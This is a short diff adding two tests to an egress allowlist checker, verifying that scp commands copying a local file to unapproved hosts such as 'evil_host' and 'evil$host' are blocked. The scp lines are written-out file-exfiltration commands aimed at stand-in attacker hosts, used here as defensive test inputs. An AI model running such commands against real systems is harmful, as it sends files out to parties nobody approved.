@@ -197,6 +197,22 @@ class TestEgressAllowlist:
         assert result is not None
         assert "evil.example" in result
 
+    def test_scp_host_alias_with_underscore_blocked(self):
+        result = _check_egress(
+            "scp local evil_host:/target",
+            allowlist=["api.openai.com"],
+        )
+        assert result is not None
+        assert "evil_host" in result
+
+    def test_unparsed_scp_remote_operand_blocked(self):
+        result = _check_egress(
+            "scp local evil$host:/target",
+            allowlist=["api.openai.com"],
+        )
+        assert result is not None
+        assert "unparsed non-HTTP destination" in result
+
     def test_url_userinfo_stripped_before_allowlist(self):
         assert (
             _check_egress(
